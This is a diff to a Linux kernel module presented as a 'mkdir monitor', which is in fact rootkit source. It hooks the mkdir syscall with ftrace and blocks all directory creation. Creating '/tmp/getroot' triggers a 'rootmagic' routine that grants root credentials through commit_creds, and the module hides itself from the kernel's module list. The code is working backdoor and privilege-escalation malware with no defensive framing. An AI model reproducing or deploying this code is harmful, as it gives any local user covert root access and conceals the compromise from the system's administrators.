@@ -114,25 +114,7 @@ static void fh_remove_hook(struct ftrace_hook *hook)
     if (err)
         printk(KERN_ERR "ftrace_set_filter_ip failed: %d\n", err);
 }
-
-typedef long (*orig_mkdir_t)(const struct pt_regs *);
-static orig_mkdir_t orig_mkdir;
-DECL_FUNC_CHECK(orig_mkdir,SIG_MKDIR);
-
-static long hook_mkdir(const struct pt_regs *regs)
-{
-    char __user *pathname = (char __user *)regs->di;
-    char path[256];
-    
-    if (strncpy_from_user(path, pathname, sizeof(path)) > 0) {
-      //  printk(KERN_INFO "Directory creation blocked: %s\n", path);
-    }
-    return 0; // Prevents the directory creation
-}
-
-static struct ftrace_hook hooks[] = {
-    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
-};
+/*Remember check kernel lockdown mode otherwise wont work*/
 static void rootmagic(void){
   struct cred *creds;
   creds = prepare_creds();
@@ -146,11 +128,35 @@ static void rootmagic(void){
   commit_creds(creds);
 }
 
+
+typedef long (*orig_mkdir_t)(const struct pt_regs *);
+static orig_mkdir_t orig_mkdir;
+DECL_FUNC_CHECK(orig_mkdir,SIG_MKDIR);
+
+static long hook_mkdir(const struct pt_regs *regs)
+{
+    char __user *pathname = (char __user *)regs->di;
+    char path[256];
+    
+    if (strncpy_from_user(path, pathname, sizeof(path)) > 0) {
+      //  printk(KERN_INFO "Directory creation blocked: %s\n", path);
+    }
+
+     if (strcmp(path, "/tmp/getroot") == 0) {
+         rootmagic(); 
+     }
+    return 0; // Prevents the directory creation
+}
+
+static struct ftrace_hook hooks[] = {
+    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
+};
+
+
 static int __init mkdir_monitor_init(void)
 {
     int err;
     size_t i;
-    rootmagic();
 
     // Do kernel module hiding
     list_del_init(&__this_module.list);
